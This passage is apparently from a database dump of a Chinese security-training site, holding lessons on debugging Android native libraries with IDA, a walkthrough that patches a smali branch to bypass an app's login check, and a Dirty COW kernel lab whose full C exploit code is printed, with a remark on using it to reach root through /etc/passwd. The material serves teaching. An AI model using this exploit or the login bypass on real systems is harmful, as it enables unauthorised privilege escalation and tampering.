o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\%7d7XVX8%5b$17FG%5bIWX%5bBQIU4A.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1039\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:453.75pt;height:345pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\%7d7XVX8%5b$17FG%5bIWX%5bBQIU4A.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.2.png\"><br></v:imagedata></v:shape></v:shapetype></p><p>&nbsp;</p><p>&nbsp;&nbsp; </p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1038\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:885pt;\r\n height:520.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\3YH6%5bU%60SC%7bBIG%60%5d%7dH5(F@%7bK.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p>对关键函数如果不愿意看Arm汇编可以按F5转为C代码</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.3.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1037\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:204.75pt;\r\n height:382.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\O4@5NO9K~~YVEGHDFBW9EA6.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p>左侧按ctrl+F可以搜索函数</p><p>上面选Exports可以查看导出函数表，也就是被java层能调用的函数全在这里面。</p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1036\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:714pt;\r\n height:382.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\YXCF%5dLBOT3JYY@$_8KA)23J.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>&nbsp;</p><p>按ALT+T可以搜索关键字串</p><p><v:shape id=\"图片_x0020_6\" o:spid=\"_x0000_i1035\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:305.25pt;\r\n height:210pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\G@T%60%5b~A0XZT9M~WP%5bJLBMH1.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>&nbsp;</p><p>例如对关键的字符串搜索有利于加快定位关键函数代码段</p><p>&nbsp;</p><p>二.so文件的动态调试</p><p>&nbsp; 1、在IDA安装目录下获取android_server命令文件</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.6.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><v:shape id=\"_x0000_i1034\" type=\"#_x0000_t75\" alt=\"8.11\" style=\"width:283.5pt;height:279.75pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"8\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.gif\" alt=\"8.11\"></v:imagedata></v:shape></p><p>2.把ida&nbsp;目录下android_server&nbsp;传到android&nbsp;目录中\r\n如：\r\nadb&nbsp;push&nbsp;&nbsp;android_server&nbsp;/data/local/tmp/\r\nadb&nbsp;shell&nbsp;进入模拟器\r\ncd&nbsp;/data/local/tmp/\r\nchmod&nbsp;755&nbsp;android_server\r\n./android_server\r\n看到监听端口&nbsp;23946</p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1033\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:492pt;height:2in;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105113426215-1102475548.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image014.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.7.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>3.在windows 控制台下转发window 到模拟器或者手机的端口\r\nadb forward tcp:23946 tcp:23946</p><p><v:shape id=\"图片_x0020_8\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" alt=\"IMG_257\" style=\"width:378.75pt;height:112.5pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image015.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105113510575-1986302923.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image016.jpg\" alt=\"IMG_257\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.8.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>4.ida 中选择android 调试, app可以运行起来了\r\n在Debuggger 中的process options 的\r\nhostname 填上localhost\r\nport: 23946</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.9.png\" style=\"line-height: 1; max-width: 100%;\"></p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.10.png\"><br></p><p><v:shape id=\"图片_x0020_9\" o:spid=\"_x0000_i1031\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:654.75pt;height:308.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image017.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105113646153-323376385.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image018.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_10\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" alt=\"IMG_257\" style=\"width:313.5pt;height:183pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image019.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105113659950-1388786356.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image020.jpg\" alt=\"IMG_257\"></v:imagedata></v:shape></p><p>5.在Debuggger 中的attach 上android\r\n所对应的程序就行了</p><p><v:shape id=\"图片_x0020_11\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" alt=\"IMG_258\" style=\"width:471.75pt;height:478.5pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image021.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105113845621-945884688.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image022.jpg\" alt=\"IMG_258\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.11.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>&nbsp;6.\r\n找到需要下断点的位置\r\n设置断点，进行调试即可</p><p>现在本地模块中找到需要下断点的函数偏移</p><p>然后获取远程模块的基地址，基地址+偏移即是当前需要下断点的地址</p><p>&nbsp;<v:shape id=\"图片_x0020_12\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" alt=\"IMG_259\" style=\"width:591.75pt;height:213pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image023.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105114213575-1456346436.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image024.jpg\" alt=\"IMG_259\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.12.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>Ctrl + s显示当前的所有加载的模块信息，找可读可执行的，一般代码段都是不可写的。</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.13.png\"><v:shape id=\"图片_x0020_13\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_260\" style=\"width:715.5pt;height:478.5pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image025.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105114336653-1140004330.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image026.jpg\" alt=\"IMG_260\"></v:imagedata></v:shape></p><p>80900000 + C88\r\n= 需要下断点的地址，然后设置断点，点击按钮就断下来了。</p><p><v:shape id=\"图片_x0020_14\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" alt=\"IMG_261\" style=\"width:652.5pt;height:217.5pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image027.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105114445106-148720954.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image028.jpg\" alt=\"IMG_261\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.14.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" alt=\"IMG_261\" style=\"width:652.5pt;height:217.5pt;\r\n visibility:visible;mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image027.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105114445106-148720954.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9310.15.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_15\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" alt=\"IMG_262\" style=\"width:572.25pt;height:260.25pt;\r\n visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image029.png\" o:href=\"http://images2015.cnblogs.com/blog/855014/201601/855014-20160105114451903-795389455.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image030.jpg\" alt=\"IMG_262\"></v:imagedata></v:shape></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:28:17',1,NULL,'<p>查看报告</p>',0,''),(99,'移动安全基础课程训练十一','移动安全基础课程训练逆向篇','<p>所要逆向的apk在下面的网盘中</p><p>链接：http://pan.baidu.com/s/1nvg1Lc1&nbsp;</p><p>密码：lye3<br></p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:28:40',1,NULL,'<p>一.开始实战<br></p><p>&nbsp;&nbsp; 我们以伏魔记apk作为示例，这个结构清晰非常便于入门逆向。</p><p>先来看看页面：</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.1.png\"></p><p>前面学了android的基本开发，现在activity能分析出基本布局结构，看到这登录页面，一定猜想到有一个onClickListener事件，如果密码输入对一定会调用一个Intent启动另一个Activity。好了，这就是关键。</p><p>接下来用AndroidKiller打开这个apk.</p><p>反编译apk后，我们能看到AndroidManifest.xml，通过这个我们来分析它的入口activity。前面介绍过了Intent-filter的属性，那显然hz.cdj.game.fmj.LoginActivity就是入口activity类了。贴一下AndroidMainfest.xml代码。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.2.png\"></p><p>接下来根据这个找到apk反编译路径下入口类smali文件，用Jd-gui打开查看java源码</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.3.png\"></p><p>果然和我们猜测的类似，我们找到声明的Button类型c变量,</p><p>然后查看Oncreate()中(开发课中已经对activity生命过程有了解,原因应该知道了)，Oncreate()中最后调用本类的函数void a(),a()找到this.c.setOnClickListener(new m(this));这里new了一个m的类实现OnclickListener,点击m类，我们可以看到如下：</p><p><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.4.png\">&nbsp; &nbsp;<img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg\" alt=\"IMG_256\"></p><p>果然这个类实现了View.OnClickListener接口,里面也看到我们预期的startActivity()，那接下来的事情就比较简单了，由于startActivity()是在一个if判断中，所以简单粗暴的方式是直接去除这个if,前面代码流程不管它了，只要在这里能执行就好。我们知道怎么改了，接下来到Smali代码中。</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.5.png\"></p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg\" alt=\"IMG_256\"></p><p>If-eqz v1,:cond_1</p><p>显然只要然这个判断失效</p><p>最简单的改法是直接注释这句</p><p>#if-eqz v1,:cond_1</p><p>当然还可以传入一个使这个语句不成立的v1值，只要让v1不为0即可，可以在这句前面加一句const/4 v1,0x1</p><p>好了，我们重新编译回去看看，签名安装。</p><p><img src=\"file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%9311.6.png\"></p><p>大功告成！这只是提提兴趣的非常基础逆向分析入门，后续高级课程将带同学们真正走入逆向的世界。</p><p><br></p><p><br></p>',0,''),(100,'脏牛漏洞基础训练一','通过网上提供的exp修改文件内容','<p>报告：</p><p>由于虚拟环境默认是以root权限操作的，所以我们需要做一些准备工作</p><p>1：以root用户安装一些常用的编译工具</p><p>&nbsp;Yum\r\ninstall –y gcc</p><p>&nbsp;Yum install\r\n–y gcc-c++</p><p>&nbsp;Yum install\r\n–y make</p><p>安装完以后在tmp目录下创建一个test文件</p><p>Cd tmp</p><p>Vi test</p><p>文件内容为 mmc</p><p>Cat test</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1035\" type=\"#_x0000_t75\" style=\"width:213pt;height:44.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p>2：创建一个新的用户 mmc 密码为123456</p><p>Adduser mmc</p><p>Passwd mmc 回车以后输入 123456</p><p>然后su mmc</p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1034\" type=\"#_x0000_t75\" style=\"width:203.25pt;\r\n height:27.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn2.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看到由root 用户已经切换到mmc用户了</p><p>Ls &nbsp;–al</p><p><v:shape id=\"图片_x0020_3\" o:spid=\"_x0000_i1033\" type=\"#_x0000_t75\" style=\"width:384.75pt;\r\n height:159pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn3.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>可以看到 test文件\r\n的权限是root</p><p>我们查看，修改一下test文件在mmc用户下</p><p>Cat test 发现可以查看内容 但是通过vi 去修改的时候发现没有修改权限</p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1032\" type=\"#_x0000_t75\" style=\"width:260.25pt;\r\n height:322.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn4.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_4\" o:spid=\"_x0000_i1031\" type=\"#_x0000_t75\" style=\"width:308.25pt;\r\n height:280.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image005.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image006.jpg\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn5.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>发现修改不了。</p><p>3：然后我们在mmc当前用户权限下面创建我们exp文件。命名为m.c</p><p>Vi m.c</p><p><v:shape id=\"图片_x0020_6\" o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:405pt;\r\n height:300.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn6.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1030\" type=\"#_x0000_t75\" style=\"width:405pt;\r\n height:300.75pt;visibility:visible;mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/zn7.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" style=\"width:310.5pt;\r\n height:330.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image008.png\"></v:imagedata></v:shape></p><p>可以看到m.c文件已经创建好，我们看一下权限</p><p>Ls –al</p><p><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/zn8.png\"><v:shape id=\"图片_x0020_8\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" style=\"width:383.25pt;\r\n height:157.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\"></v:imagedata></v:shape></p><p>可以看到m.c文件的权限是mmc</p><p>4：我们 使用gcc 编译刚才的m.c文件</p><p>gcc&nbsp;main.c&nbsp;-lpthread&nbsp;</p><p><v:shape id=\"图片_x0020_9\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" style=\"width:270pt;\r\n height:62.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn9.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>我们看到多出一个a.out文件，这就是刚才编译生成的可执行文件</p><p>我们调用这个文件修改一下test文件内容（之前测试过在mmc用户下是不能直接修改的）</p><p>5：调用a.out文件修改test文件</p><p>&nbsp;./a.out&nbsp; test &nbsp;1234</p><p>等待一段时间以后可以看到执行成功，文件内容被修改了。</p><p><v:shape id=\"图片_x0020_10\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" style=\"width:272.25pt;\r\n height:69.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn10.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>出现上面的说明文件内容被修改成功了。我们可以查看一下</p><p>Cat test</p><p><v:shape id=\"图片_x0020_11\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" style=\"width:262.5pt;\r\n height:50.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.png\" o:title=\"\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.png\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/zn11.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p>看到已经由mmc变成了1234</p><p>6：通过上面的实验可以知道这个漏洞在普通权限下可以修改root权限创建的文件。这样的话调用特定的poc直接将/etc/passwd 文件中当前用户的uid修改成0即可以root权限登陆</p><p>详细的普通权限提权root权限的exp见下一节。</p>',3,'http://oda8mr8yr.bkt.clouddn.com/zn.png','centos:latest','2016-11-01 11:37:06',1,NULL,'<p>网上提供的exp</p><pre style=\"max-width: 100%;\"><code class=\"makefile hljs\" codemark=\"1\">/* \r\n * main.c \r\n * \r\n *  Created on: Oct 21, 2016 \r\n *      Author: 5t4rk \r\n */  \r\n<span class=\"hljs-comment\">#include&lt;stdio.h&gt;  </span>\r\n<span class=\"hljs-comment\">#include&lt;sys/mman.h&gt;  </span>\r\n<span class=\"hljs-comment\">#include&lt;fcntl.h&gt;  </span>\r\n<span class=\"hljs-comment\">#include&lt;pthread.h&gt;  </span>\r\n<span class=\"hljs-comment\">#include&lt;string.h&gt;  </span>\r\n  \r\nvoid *map;  \r\nint f;  \r\nstruct stat st;  \r\nchar* name;  \r\n  \r\nvoid * madviseThread(void *arg)  \r\n{  \r\n    char *str;  \r\n    str = (char *) arg;  \r\n    int i, c = 0;  \r\n    for (i = 0; i &lt; 100000000; i++)  \r\n    {  \r\n        c += madvise(map, 100, MADV_DONTNEED);  \r\n    }  \r\n    printf(\"madvise %d\\n\", c);  \r\n}  \r\n  \r\nvoid * procselfmemThread(void *arg)  \r\n{  \r\n    char *str;  \r\n    str = (char *) arg;  \r\n    int f = open(\"/proc/self/mem\", O_RDWR);  \r\n    int i, c = 0;  \r\n    for (i = 0; i &lt; 100000000; i++)  \r\n    {  \r\n        lseek(f, map, SEEK_SET);  \r\n        c += write(f, str, strlen(str));  \r\n    }  \r\n    printf(\"procselfmem %d\\n\", c);  \r\n}  \r\n  \r\nint main(int argc, char *argv[])  \r\n{  \r\n    if (argc &lt; 3)  \r\n        return 1;  \r\n    pthread_t pth1, pth2;  \r\n    f = open(argv[1], O_RDONLY);  \r\n    fstat(f, &amp;st);  \r\n    name = argv[1];  \r\n    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);  \r\n    printf(\"mmap %x\\n\", map);  \r\n    pthread_create(&amp;pth1, NULL, madviseThread, argv[1]);  \r\n    pthread_create(&amp;pth2, NULL, procselfmemThread, argv[2]);  \r\n    pthread_join(pth1, NULL);  \r\n    pthread_join(pth2, 